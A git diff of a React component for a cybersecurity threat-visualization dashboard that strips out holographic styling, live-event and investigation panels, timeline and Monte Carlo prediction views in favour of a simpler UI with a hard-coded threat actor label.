-      {/* Hover Tooltip - holographic */}
+      {/* Hover Tooltip */}
       {hoveredDomain && !selectedDomain && (
         <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-[120%] z-10 pointer-events-none">
-          <div className="px-4 py-3 rounded-lg border bg-[#040c1a]/85 backdrop-blur-xl" style={{ borderColor: `${hoveredDomain.color}20`, boxShadow: `0 0 20px ${hoveredDomain.color}10` }}>
+          <div className="px-4 py-3 rounded-xl border bg-slate-900/90 backdrop-blur-md" style={{ borderColor: `${hoveredDomain.color}40` }}>
             <div className="flex items-center gap-2">
-              <div className="w-2.5 h-2.5 rounded-full" style={{ backgroundColor: hoveredDomain.color, boxShadow: `0 0 8px ${hoveredDomain.color}` }} />
-              <span className="text-xs font-mono font-bold text-white/90 tracking-wide">{hoveredDomain.name.toUpperCase()}</span>
+              <div className="w-3 h-3 rounded-full" style={{ backgroundColor: hoveredDomain.color }} />
+              <span className="text-sm font-bold text-white">{hoveredDomain.name}</span>
             </div>
-            <div className="text-[10px] text-slate-500 mt-1 font-mono">{hoveredDomain.description}</div>
-            <div className="flex gap-4 mt-2 text-[9px] font-mono">
-              <span className="text-slate-500">HLTH:<span className="text-emerald-400 font-bold ml-1">{hoveredDomain.health}%</span></span>
-              <span className="text-slate-500">ATK:<span className="text-red-400 font-bold ml-1">{hoveredDomain.attacks}</span></span>
-              <span className="text-slate-500">PRS:<span className="text-orange-400 font-bold ml-1">{hoveredDomain.pressure}%</span></span>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Ambient Scene Events - visible when no domain selected */}
-      {!selectedDomain && liveEvents.length > 0 && (
-        <div className="absolute bottom-20 left-4 z-10 w-[360px]">
-          <div className="rounded-xl border border-cyan-500/8 bg-[#040c1a]/70 backdrop-blur-2xl p-3 shadow-2xl shadow-cyan-900/10" style={{ boxShadow: '0 0 30px rgba(6,182,212,0.04), inset 0 0 20px rgba(6,182,212,0.02)' }}>
-            <div className="absolute inset-0 overflow-hidden rounded-xl pointer-events-none">
-              <div className="absolute inset-x-0 h-[1px] bg-gradient-to-r from-transparent via-cyan-400/20 to-transparent animate-pulse" style={{ top: '25%' }} />
-            </div>
-            <div className="flex items-center gap-2 mb-2 relative">
-              <div className="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-pulse" />
-              <span className="text-[9px] font-mono text-cyan-400/70 uppercase tracking-[0.15em]">Scene Intercepts</span>
-              <span className="text-[8px] font-mono text-slate-600 ml-auto">{liveEvents.length} signals</span>
-            </div>
-            <div className="space-y-1 max-h-[180px] overflow-hidden">
-              {liveEvents.map((evt, i) => (
-                <button
-                  key={`ambient-${evt.ts}-${i}`}
-                  onClick={() => setSelectedEvent({ id: i, ts: evt.ts, type: evt.type, domain: 'unknown', detail: evt.detail, severity: evt.severity })}
-                  className="w-full flex items-start gap-2 text-[9px] font-mono py-1.5 px-2 rounded bg-white/[0.01] border-l-2 transition-all duration-300 hover:bg-cyan-500/[0.05] hover:border-l-cyan-400 text-left group"
-                  style={{
-                    borderLeftColor: evt.severity === 'CRITICAL' ? '#ef4444' : evt.severity === 'HIGH' ? '#f97316' : '#eab308',
-                    opacity: 1 - i * 0.08,
-                  }}
-                >
-                  <span className="text-slate-600 shrink-0">{evt.ts}</span>
-                  <span className={`shrink-0 font-bold ${evt.severity === 'CRITICAL' ? 'text-red-400' : evt.severity === 'HIGH' ? 'text-orange-400' : 'text-yellow-400'}`}>
-                    {evt.type}
-                  </span>
-                  <span className="text-slate-500 truncate">{evt.src} &rarr; {evt.dst}</span>
-                  <span className="text-[8px] text-cyan-500/0 group-hover:text-cyan-500/70 transition-all ml-auto shrink-0">[INVESTIGATE]</span>
-                </button>
-              ))}
-            </div>
-            <div className="mt-2 pt-2 border-t border-white/[0.03] flex items-center justify-between">
-              <span className="text-[8px] font-mono text-slate-600">Click event to begin investigation</span>
-              <span className="text-[8px] font-mono text-cyan-500/40 animate-pulse">MONITORING</span>
+            <div className="text-xs text-slate-400 mt-1">{hoveredDomain.description}</div>
+            <div className="flex gap-4 mt-2 text-[10px]">
+              <span className="text-slate-400">Health: <span className="text-white font-bold">{hoveredDomain.health}%</span></span>
+              <span className="text-slate-400">Attacks: <span className="text-red-400 font-bold">{hoveredDomain.attacks}</span></span>
             </div>
           </div>
         </div>
       )}
 
-      {/* Selected Domain Panel - Minority Report Style */}
+      {/* Selected Domain Panel */}
       {selectedDomain && (
-        <div className="absolute bottom-20 left-4 z-10 w-[420px]">
-          <div className="rounded-xl border border-cyan-500/10 bg-[#040c1a]/80 backdrop-blur-2xl p-4 shadow-2xl shadow-cyan-900/20" style={{ boxShadow: `0 0 40px ${selectedDomain.color}10, inset 0 0 30px ${selectedDomain.color}05` }}>
-            {/* Holographic scan line animation */}
-            <div className="absolute inset-0 overflow-hidden rounded-xl pointer-events-none">
-              <div className="absolute inset-x-0 h-[1px] bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent animate-pulse" style={{ top: '30%' }} />
-              <div className="absolute inset-x-0 h-[1px] bg-gradient-to-r from-transparent via-cyan-400/10 to-transparent" style={{ top: '60%', animationDelay: '1s' }} />
-            </div>
-
-            {/* Header */}
-            <div className="flex items-center justify-between mb-3 relative">
+        <div className="absolute bottom-20 left-4 z-10 max-w-sm">
+          <div className="rounded-xl border bg-slate-900/90 backdrop-blur-md p-4" style={{ borderColor: `${selectedDomain.color}40` }}>
+            <div className="flex items-center justify-between mb-3">
               <div className="flex items-center gap-2">
-                <div className="w-3 h-3 rounded-full animate-pulse" style={{ backgroundColor: selectedDomain.color, boxShadow: `0 0 12px ${selectedDomain.color}80` }} />
-                <span className="text-sm font-bold text-white/90 tracking-wide">{selectedDomain.name.toUpperCase()}</span>
-                <span className={`text-[9px] px-2 py-0.5 rounded font-mono ${selectedDomain.active ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'bg-slate-700/30 text-slate-500 border border-slate-600/20'}`}>
+                <div className="w-4 h-4 rounded-full" style={{ backgroundColor: selectedDomain.color, boxShadow: `0 0 10px ${selectedDomain.color}60` }} />
+                <span className="text-base font-bold text-white">{selectedDomain.name}</span>
+                <span className={`text-[10px] px-2 py-0.5 rounded-full font-semibold ${selectedDomain.active ? 'bg-green-500/10 text-green-400' : 'bg-slate-700/50 text-slate-500'}`}>
                   {selectedDomain.active ? 'ACTIVE' : 'DORMANT'}
                 </span>
               </div>
-              <button onClick={() => { setSelectedDomain(null); selectedIdxRef.current = -1; setLiveEvents([]); }} className="text-slate-500 hover:text-cyan-400 text-[10px] font-mono px-2 py-1 rounded border border-slate-700/30 hover:border-cyan-500/30 transition-all">
-                [ESC]
-              </button>
+              <button onClick={() => { setSelectedDomain(null); selectedIdxRef.current = -1; }} className="text-slate-500 hover:text-white text-xs px-2 py-1 rounded border border-slate-700/40 hover:border-white/20 transition-all">ESC</button>
             </div>
-
-            {/* Stats Grid */}
-            <div className="grid grid-cols-4 gap-2 mb-3">
-              {[
-                { label: 'HEALTH', value: `${selectedDomain.health}%`, color: selectedDomain.health > 70 ? '#10b981' : selectedDomain.health > 40 ? '#f59e0b' : '#ef4444' },
-                { label: 'PRESSURE', value: `${selectedDomain.pressure}%`, color: selectedDomain.pressure > 70 ? '#ef4444' : '#f59e0b' },
-                { label: 'ATTACKS', value: String(selectedDomain.attacks), color: '#ef4444' },
-                { label: 'CAPACITY', value: `${100 - selectedDomain.pressure}%`, color: '#06b6d4' },
-              ].map((stat) => (
-                <div key={stat.label} className="text-center px-2 py-1.5 rounded-lg bg-white/[0.02] border border-white/[0.04]">
-                  <div className="text-base font-mono font-bold" style={{ color: stat.color }}>{stat.value}</div>
-                  <div className="text-[8px] text-slate-500 uppercase tracking-wider mt-0.5">{stat.label}</div>
-                </div>
-              ))}
+            <div className="grid grid-cols-4 gap-3">
+              <div className="text-center"><div className="text-lg font-black text-white">{selectedDomain.health}%</div><div className="text-[9px] text-slate-500 uppercase">Health</div></div>
+              <div className="text-center"><div className="text-lg font-black" style={{ color: selectedDomain.pressure > 70 ? '#ef4444' : '#f59e0b' }}>{selectedDomain.pressure}%</div><div className="text-[9px] text-slate-500 uppercase">Pressure</div></div>
+              <div className="text-center"><div className="text-lg font-black text-red-400">{selectedDomain.attacks}</div><div className="text-[9px] text-slate-500 uppercase">Attacks</div></div>
+              <div className="text-center"><div className="text-lg font-black text-cyan-400">{100 - selectedDomain.pressure}%</div><div className="text-[9px] text-slate-500 uppercase">Capacity</div></div>
             </div>
-
-            {/* Progress Bar */}
-            <div className="h-0.5 bg-slate-800/50 rounded-full overflow-hidden mb-3">
-              <div className="h-full rounded-full transition-all duration-700" style={{ width: `${selectedDomain.health}%`, backgroundColor: selectedDomain.color, boxShadow: `0 0 6px ${selectedDomain.color}` }} />
-            </div>
-
-            {/* Live Event Stream */}
-            <div className="border-t border-cyan-500/10 pt-2">
-              <div className="flex items-center gap-2 mb-2">
-                <div className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
-                <span className="text-[9px] font-mono text-cyan-400/70 uppercase tracking-[0.15em]">Live Event Stream</span>
-                <span className="text-[8px] font-mono text-slate-600 ml-auto">{liveEvents.length} events</span>
-              </div>
-              <div className="space-y-1 max-h-[140px] overflow-hidden">
-                {liveEvents.length === 0 ? (
-                  <div className="text-[10px] text-slate-600 font-mono text-center py-3 animate-pulse">Intercepting traffic...</div>
-                ) : (
-                  liveEvents.map((evt, i) => (
-                    <button
-                      key={`${evt.ts}-${i}`}
-                      onClick={() => setSelectedEvent({ id: i, ts: evt.ts, type: evt.type, domain: selectedDomain?.id || 'network', detail: evt.detail, severity: evt.severity })}
-                      className="w-full flex items-start gap-2 text-[9px] font-mono py-1 px-1.5 rounded bg-white/[0.01] border-l-2 transition-all duration-300 hover:bg-cyan-500/[0.03] text-left"
-                      style={{
-                        borderLeftColor: evt.severity === 'CRITICAL' ? '#ef4444' : evt.severity === 'HIGH' ? '#f97316' : '#eab308',
-                        opacity: 1 - i * 0.1,
-                      }}
-                    >
-                      <span className="text-slate-600 shrink-0">{evt.ts}</span>
-                      <span className={`shrink-0 font-bold ${evt.severity === 'CRITICAL' ? 'text-red-400' : evt.severity === 'HIGH' ? 'text-orange-400' : 'text-yellow-400'}`}>
-                        {evt.type}
-                      </span>
-                      <span className="text-slate-500 truncate">{evt.src} &rarr; {evt.dst}</span>
-                    </button>
-                  ))
-                )}
-              </div>
-              {liveEvents.length > 0 && (
-                <div className="mt-1.5 text-[8px] font-mono text-slate-600 truncate px-1">
-                  {liveEvents[0]?.detail}
-                </div>
-              )}
+            <div className="mt-3 h-1.5 bg-slate-800 rounded-full overflow-hidden">
+              <div className="h-full rounded-full transition-all" style={{ width: `${selectedDomain.health}%`, backgroundColor: selectedDomain.health > 70 ? '#10b981' : selectedDomain.health > 40 ? '#f59e0b' : '#ef4444' }} />
             </div>
           </div>
         </div>
       )}
 
-      {/* Event Investigation Panel (from clicking live events) */}
-      {selectedEvent && timelineMode === 'present' && (
-        <div className="absolute top-24 right-4 z-30 w-72">
-          <div className="rounded-xl border border-cyan-500/15 bg-[#040c1a]/90 backdrop-blur-2xl p-4 shadow-2xl" style={{ boxShadow: '0 0 40px rgba(6,182,212,0.08)' }}>
-            <div className="flex items-center justify-between mb-3">
-              <div className="flex items-center gap-2">
-                <div className="w-2 h-2 rounded-full bg-cyan-400 animate-pulse" />
-                <span className="text-[9px] font-mono text-cyan-400 uppercase tracking-[0.15em]">Investigate Event</span>
-              </div>
-              <button onClick={() => setSelectedEvent(null)} className="text-slate-600 hover:text-cyan-400 text-[9px] font-mono px-1.5 py-0.5 rounded border border-slate-700/30 hover:border-cyan-500/30 transition-all">[X]</button>
-            </div>
-            <div className="space-y-2.5">
-              <div className="flex items-center gap-2">
-                <span className={`text-[10px] font-mono font-bold px-1.5 py-0.5 rounded ${
-                  selectedEvent.severity === 'CRITICAL' ? 'bg-red-500/10 text-red-400 border border-red-500/20' :
-                  'bg-orange-500/10 text-orange-400 border border-orange-500/20'
-                }`}>{selectedEvent.severity}</span>
-                <span className="text-xs font-mono font-bold text-white">{selectedEvent.type}</span>
-              </div>
-              <div className="text-[10px] font-mono text-slate-400 leading-relaxed">{selectedEvent.detail}</div>
-              <div className="text-[9px] font-mono text-slate-600">
-                TIME: <span className="text-white/70">{selectedEvent.ts}</span> | DOMAIN: <span className="text-cyan-400">{selectedEvent.domain.toUpperCase()}</span>
-              </div>
-              <div className="border-t border-white/[0.04] pt-2.5">
-                <div className="text-[8px] font-mono text-slate-600 mb-2 uppercase tracking-wider">Response Actions</div>
-                <div className="grid grid-cols-2 gap-1.5">
-                  <button className="px-2 py-2 rounded text-[9px] font-mono font-bold bg-cyan-500/5 border border-cyan-500/15 text-cyan-400 hover:bg-cyan-500/10 transition-all">
-                    TRACE ORIGIN
-                  </button>
-                  <button className="px-2 py-2 rounded text-[9px] font-mono font-bold bg-orange-500/5 border border-orange-500/15 text-orange-400 hover:bg-orange-500/10 transition-all">
-                    CORRELATE
-                  </button>
-                  <button className="px-2 py-2 rounded text-[9px] font-mono font-bold bg-red-500/5 border border-red-500/15 text-red-400 hover:bg-red-500/10 transition-all">
-                    CONTAIN HOST
-                  </button>
-                  <button className="px-2 py-2 rounded text-[9px] font-mono font-bold bg-emerald-500/5 border border-emerald-500/15 text-emerald-400 hover:bg-emerald-500/10 transition-all">
-                    OPEN CASE
-                  </button>
-                </div>
-              </div>
-              <div className="border-t border-white/[0.04] pt-2">
-                <div className="text-[8px] font-mono text-slate-600 mb-1.5 uppercase tracking-wider">Kill Chain Position</div>
-                <div className="flex gap-0.5">
-                  {['RECON', 'WEAPON', 'DELIVER', 'EXPLOIT', 'INSTALL', 'C2', 'ACTION'].map((phase, i) => (
-                    <div key={phase} className={`flex-1 h-1.5 rounded-sm ${i <= 4 ? 'bg-red-500/60' : 'bg-slate-700/30'}`} title={phase} />
-                  ))}
-                </div>
-                <div className="flex justify-between mt-1">
-                  <span className="text-[7px] font-mono text-slate-600">RECON</span>
-                  <span className="text-[7px] font-mono text-slate-600">ACTION</span>
-                </div>
-              </div>
-            </div>
+      {/* Threat Actor */}
+      <div className="absolute bottom-20 right-56 z-10 w-48">
+        <div className="rounded-xl border border-red-500/20 bg-slate-900/80 backdrop-blur-md p-3">
+          <div className="flex items-center gap-1.5 mb-1.5">
+            <Crosshair className="w-3 h-3 text-red-400" />
+            <span className="text-[9px] font-bold text-red-400 uppercase tracking-wider">Threat Actor</span>
           </div>
-        </div>
-      )}
-
-      {/* Threat Actor - rotating */}
-      <div className="absolute bottom-20 right-56 z-10 w-52">
-        <div className="rounded-xl border border-red-500/15 bg-[#0a1628]/70 backdrop-blur-xl p-3 shadow-lg shadow-red-500/5">
-          <div className="flex items-center gap-1.5 mb-2">
-            <Crosshair className="w-3 h-3 text-red-400 animate-pulse" />
-            <span className="text-[9px] font-bold text-red-400/80 uppercase tracking-[0.15em]">Active Threat Actor</span>
-          </div>
-          <div className="text-sm font-bold text-white/90 tracking-wide">{activeThreatActor.name}</div>
-          <div className="flex items-center gap-2 mt-2">
-            <div className="flex-1 h-1 bg-slate-700/30 rounded-full overflow-hidden">
-              <div
-                className="h-full rounded-full transition-all duration-1000"
-                style={{ width: `${activeThreatActor.confidence}%`, background: `linear-gradient(90deg, #ef4444, #f97316)` }}
-              />
+          <div className="text-sm font-bold text-white">APT-29 (Cozy Bear)</div>
+          <div className="flex items-center gap-2 mt-1 mb-1">
+            <div className="flex-1 h-1 bg-slate-700/50 rounded-full overflow-hidden">
+              <div className="h-full bg-gradient-to-r from-red-500 to-orange-400 rounded-full" style={{ width: '92%' }} />
             </div>
-            <span className="text-[10px] font-mono font-bold text-red-400">{activeThreatActor.confidence}%</span>
+            <span className="text-[10px] font-bold text-red-400">92%</span>
           </div>
-          <div className="text-[9px] text-slate-500 mt-1.5 font-mono">TTP MATCH // MITRE ATT&CK CORRELATION</div>
         </div>
       </div>
 
-      {/* Timeline Scrubber HUD */}
-      {handTrackingOn && timelineMode !== 'present' && (
-        <div className="absolute top-16 left-1/2 -translate-x-1/2 z-40 pointer-events-none">
-          <div className="px-6 py-2 rounded-full border bg-[#040c1a]/80 backdrop-blur-2xl" style={{ borderColor: timelineMode === 'past' ? '#06b6d450' : '#ef444450' }}>
-            <div className="flex items-center gap-3">
-              <span className="text-[9px] font-mono uppercase tracking-[0.2em]" style={{ color: timelineMode === 'past' ? '#06b6d4' : '#ef4444' }}>
-                {timelineMode === 'past' ? 'TEMPORAL REWIND' : 'MONTE CARLO PROJECTION'}
-              </span>
-              <div className="w-32 h-1 bg-slate-800 rounded-full relative overflow-visible">
-                <div
-                  className="absolute top-1/2 -translate-y-1/2 w-2 h-2 rounded-full transition-all duration-100"
-                  style={{
-                    left: `${(timelineOffset + 1) * 50}%`,
-                    backgroundColor: timelineMode === 'past' ? '#06b6d4' : '#ef4444',
-                    boxShadow: `0 0 8px ${timelineMode === 'past' ? '#06b6d4' : '#ef4444'}`,
-                  }}
-                />
-                <div className="absolute top-1/2 left-1/2 -translate-y-1/2 -translate-x-1/2 w-0.5 h-3 bg-white/20" />
-              </div>
-              <span className="text-[10px] font-mono font-bold" style={{ color: timelineMode === 'past' ? '#06b6d4' : '#ef4444' }}>
-                {timelineMode === 'past' ? `-${Math.floor(Math.abs(timelineOffset) * 60)}min` : `+${Math.floor(Math.abs(timelineOffset) * 60)}min`}
-              </span>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Past Events - Floating Timeline Cards */}
-      {timelineMode === 'past' && timelineEvents.length > 0 && (
-        <div className="absolute inset-0 z-20 pointer-events-none">
-          <div className="absolute top-24 right-4 w-64 pointer-events-auto">
-            <div className="rounded-xl border border-cyan-500/10 bg-[#040c1a]/85 backdrop-blur-2xl p-3 shadow-2xl">
-              <div className="flex items-center gap-2 mb-2">
-                <div className="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-pulse" />
-                <span className="text-[9px] font-mono text-cyan-400/80 uppercase tracking-[0.15em]">Historical Events</span>
-              </div>
-              <div className="space-y-1.5 max-h-[360px] overflow-y-auto">
-                {timelineEvents.map((evt) => (
-                  <button
-                    key={evt.id}
-                    onClick={() => setSelectedEvent(evt)}
-                    className={`w-full text-left px-2 py-1.5 rounded border transition-all ${
-                      selectedEvent?.id === evt.id
-                        ? 'border-cyan-500/40 bg-cyan-500/5'
-                        : 'border-white/[0.03] bg-white/[0.01] hover:border-cyan-500/20 hover:bg-cyan-500/[0.03]'
-                    }`}
-                  >
-                    <div className="flex items-center gap-1.5">
-                      <span className="text-[8px] font-mono text-slate-600">{evt.ts}</span>
-                      <span className={`text-[9px] font-mono font-bold ${evt.severity === 'CRITICAL' ? 'text-red-400' : evt.severity === 'HIGH' ? 'text-orange-400' : 'text-yellow-400'}`}>
-                        {evt.type}
-                      </span>
-                    </div>
-                    <div className="text-[8px] font-mono text-slate-500 mt-0.5 truncate">{evt.detail}</div>
-                  </button>
-                ))}
-              </div>
-            </div>
-          </div>
-
-          {/* Investigation from selected event */}
-          {selectedEvent && (
-            <div className="absolute bottom-24 right-4 w-72 pointer-events-auto">
-              <div className="rounded-xl border border-cyan-500/20 bg-[#040c1a]/90 backdrop-blur-2xl p-4 shadow-2xl" style={{ boxShadow: '0 0 30px rgba(6,182,212,0.1)' }}>
-                <div className="flex items-center justify-between mb-2">
-                  <span className="text-[9px] font-mono text-cyan-400 uppercase tracking-wider">Investigation Target</span>
-                  <button onClick={() => setSelectedEvent(null)} className="text-slate-600 hover:text-white text-[9px] font-mono">[X]</button>
-                </div>
-                <div className="space-y-2">
-                  <div className="flex items-center gap-2">
-                    <div className={`w-2 h-2 rounded-full ${selectedEvent.severity === 'CRITICAL' ? 'bg-red-500' : 'bg-orange-500'} animate-pulse`} />
-                    <span className="text-xs font-mono font-bold text-white">{selectedEvent.type}</span>
-                    <span className="text-[9px] font-mono text-slate-500">{selectedEvent.ts}</span>
-                  </div>
-                  <div className="text-[10px] font-mono text-slate-400">{selectedEvent.detail}</div>
-                  <div className="text-[9px] font-mono text-slate-600">DOMAIN: <span className="text-cyan-400">{selectedEvent.domain.toUpperCase()}</span></div>
-                  <div className="grid grid-cols-2 gap-1.5 mt-2">
-                    <button className="px-2 py-1.5 rounded text-[9px] font-mono font-bold bg-cyan-500/10 border border-cyan-500/20 text-cyan-400 hover:bg-cyan-500/20 transition-all">
-                      TRACE ORIGIN
-                    </button>
-                    <button className="px-2 py-1.5 rounded text-[9px] font-mono font-bold bg-orange-500/10 border border-orange-500/20 text-orange-400 hover:bg-orange-500/20 transition-all">
-                      CORRELATE
-                    </button>
-                    <button className="px-2 py-1.5 rounded text-[9px] font-mono font-bold bg-red-500/10 border border-red-500/20 text-red-400 hover:bg-red-500/20 transition-all">
-                      ISOLATE HOST
-                    </button>
-                    <button className="px-2 py-1.5 rounded text-[9px] font-mono font-bold bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 hover:bg-emerald-500/20 transition-all">
-                      OPEN CASE
-                    </button>
-                  </div>
-                </div>
-              </div>
-            </div>
-          )}
-        </div>
-      )}
-
-      {/* Future Monte Carlo Predictions */}
-      {timelineMode === 'future' && monteCarloLines.length > 0 && (
-        <div className="absolute inset-0 z-20 pointer-events-none">
-          <div className="absolute top-24 right-4 w-72 pointer-events-auto">
-            <div className="rounded-xl border border-red-500/10 bg-[#040c1a]/85 backdrop-blur-2xl p-3 shadow-2xl">
-              <div className="flex items-center gap-2 mb-3">
-                <div className="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse" />
-                <span className="text-[9px] font-mono text-red-400/80 uppercase tracking-[0.15em]">Predictive Analysis // Monte Carlo</span>
-              </div>
-              <div className="space-y-2">
-                {monteCarloLines.map((pred) => (
-                  <div key={pred.id} className="px-2 py-2 rounded border border-white/[0.03] bg-white/[0.01]">
-                    <div className="flex items-center justify-between mb-1">
-                      <span className="text-[10px] font-mono font-bold text-white/90">{pred.label}</span>
-                      <span className={`text-[8px] font-mono px-1.5 py-0.5 rounded ${
-                        pred.impact === 'CATASTROPHIC' ? 'bg-red-500/10 text-red-400' :
-                        pred.impact === 'CRITICAL' ? 'bg-orange-500/10 text-orange-400' :
-                        'bg-yellow-500/10 text-yellow-400'
-                      }`}>{pred.impact}</span>
-                    </div>
-                    <div className="flex items-center gap-2">
-                      <div className="flex-1 h-1.5 bg-slate-800/50 rounded-full overflow-hidden">
-                        <div
-                          className="h-full rounded-full transition-all duration-700"
-                          style={{ width: `${pred.probability}%`, backgroundColor: pred.color, boxShadow: `0 0 4px ${pred.color}` }}
-                        />
-                      </div>
-                      <span className="text-[10px] font-mono font-bold" style={{ color: pred.color }}>{pred.probability}%</span>
-                    </div>
-                  </div>
-                ))}
-              </div>
-              <div className="mt-3 pt-2 border-t border-white/[0.04]">
-                <div className="text-[8px] font-mono text-slate-600 text-center">
-                  SIMULATIONS: 10,000 | CONFIDENCE: 94.2% | TIME HORIZON: +{Math.floor(Math.abs(timelineOffset) * 60)}min
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      )}
-
       {/* Severity Controls */}
-      <div className="absolute bottom-4 left-1/2 -translate-x-1/2 z-10 flex items-center gap-0.5 px-2 py-1 rounded-lg border border-white/[0.04] bg-[#040c1a]/60 backdrop-blur-xl">
+      <div className="absolute bottom-4 left-1/2 -translate-x-1/2 z-10 flex items-center gap-1 px-3 py-1.5 rounded-lg border border-slate-700/30 bg-slate-900/70 backdrop-blur-sm">
         {(['normal', 'elevated', 'high', 'critical'] as SeverityLevel[]).map((s) => {
           const c = getSeverityConfig(s);
           return (
             <button
               key={s}
               onClick={() => setSeverity(s)}
-              className={`px-3 py-1.5 rounded text-[9px] font-mono font-bold uppercase tracking-wider transition-all ${
-                severity === s ? 'bg-white/[0.06] scale-105 border border-white/[0.08]' : 'opacity-40 hover:opacity-90 border border-transparent'
+              className={`px-3 py-1.5 rounded-md text-[10px] font-bold uppercase tracking-wider transition-all ${
+                severity === s ? 'bg-white/10 scale-105' : 'opacity-50 hover:opacity-100'
               }`}
-              style={{ color: c.hex, textShadow: severity === s ? `0 0 8px ${c.hex}40` : 'none' }}
+              style={{ color: c.hex }}
             >
               {s}
             </button>
@@ -1952,8 +1310,8 @@ const AttackUniverse = () => {
       <div className="absolute bottom-4 left-4 z-10 flex flex-wrap gap-x-3 gap-y-1">
         {DOMAINS.map(d => (
           <div key={d.id} className="flex items-center gap-1">
-            <div className="w-1.5 h-1.5 rounded-full" style={{ backgroundColor: d.color, opacity: d.active ? 1 : 0.3, boxShadow: d.active ? `0 0 4px ${d.color}` : 'none' }} />
-            <span className="text-[8px] text-slate-600 font-mono uppercase tracking-wider">{d.name}</span>
+            <div className="w-2 h-2 rounded-full" style={{ backgroundColor: d.color, opacity: d.active ? 1 : 0.4 }} />
+            <span className="text-[8px] text-slate-500 font-medium">{d.name}</span>
           </div>
         ))}
       </div>
